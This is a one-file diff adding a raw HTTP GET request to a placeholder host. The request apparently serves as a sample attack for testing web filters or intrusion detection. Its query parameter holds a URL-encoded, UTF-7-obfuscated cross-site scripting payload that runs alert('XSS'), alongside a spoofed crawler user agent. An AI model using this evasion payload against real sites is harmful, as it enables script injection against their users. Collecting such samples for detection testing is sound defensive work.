@@ -1,0 +1,7 @@
+GET /index.php?aswer=%2B%2Fv8%20%2BADw-SCRIPT%2BAD4-alert(%27XSS%27)%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1
+Host: www.test.com
+User-Agent: fastlwspider/1.0. FAST-WebCrawler/2.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-gb,en;q=0.5
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Content-Length: 395
